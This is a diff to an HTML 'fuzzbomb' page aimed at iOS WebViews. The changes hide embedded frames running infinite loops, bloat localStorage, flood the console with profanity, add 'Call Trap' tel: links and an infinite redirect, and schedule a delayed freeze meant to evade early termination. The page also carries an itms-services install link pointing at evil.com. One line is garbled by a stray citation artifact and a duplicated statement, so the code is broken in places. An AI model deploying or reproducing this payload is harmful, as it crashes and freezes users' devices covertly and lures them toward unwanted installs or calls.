@@ -4,6 +4,7 @@
   <title>💥 iOS WebView Fuzzbomb 💥</title>
   <style>
     body { background-color: black; color: lime; font-family: monospace; }
+    iframe, object, embed { display: none; }
   </style>
 </head>
 <body>
@@ -26,8 +27,6 @@
     for (let i = 0; i < 50; i++) {
       let iframe = document.createElement('iframe');
       iframe.srcdoc = `<script>while(true){}</script>`;
-      iframe.width = 1;
-      iframe.height = 1;
       document.body.appendChild(iframe);
     }
 
@@ -49,7 +48,7 @@
     // 🔗 Protocol Handler Test
     let a = document.createElement('a');
     a.href = 'itms-services://?action=download-manifest&url=https://evil.com/manifest.plist';
-    a.innerText = 'CLICK TO TRIGGER itms-services';
+    a.innerText = 'TRIGGER itms-services';
     document.body.appendChild(a);
 
     // 🐍 Giant URI Abuse
@@ -57,6 +56,47 @@
     hugeLink.href = 'http://example.com/' + 'A'.repeat(100000);
     hugeLink.innerText = 'Oversized URI';
     document.body.appendChild(hugeLink);
+
+    // 🦠 LocalStorage Bloat
+    for (let i = 0; i < 1000; i++) {
+      localStorage.setItem('fuzz' + i, 'X'.repeat(1024 * 1024));
+    }
+
+    // 🧯 Object/Embed Bomb
+    for (let i = 0; i < 20; i++) {
+      let o = document.createElement('object ​:contentReference[oaicite:0]{index=0}​
+            let o = document.createElement('object');
+      o.data = "javascript:while(true){}";
+      document.body.appendChild(o);
+
+      let e = document.createElement('embed');
+      e.src = "javascript:while(true){}";
+      document.body.appendChild(e);
+    }
+
+    // 📞 tel: spam
+    for (let i = 0; i < 10; i++) {
+      let tel = document.createElement('a');
+      tel.href = `tel:+123456${i}`;
+      tel.innerText = `Call Trap ${i}`;
+      document.body.appendChild(tel);
+    }
+
+    // 🪵 Log flood
+    for (let i = 0; i < 1e6; i++) {
+      console.log("FUCK YOU, DEBUGGER #" + i);
+    }
+
+    // 🔄 Infinite redirect test (Only trigger if manual click)
+    let redir = document.createElement('a');
+    redir.href = 'data:text/html,<script>location.href=location.href</script>';
+    redir.innerText = '⚠️ INFINITE REDIRECT';
+    document.body.appendChild(redir);
+
+    // ⌛ Event loop freeze (delayed to bypass early kill)
+    setTimeout(() => {
+      while (true) {}
+    }, 10000);
   </script>
 </body>
 </html>
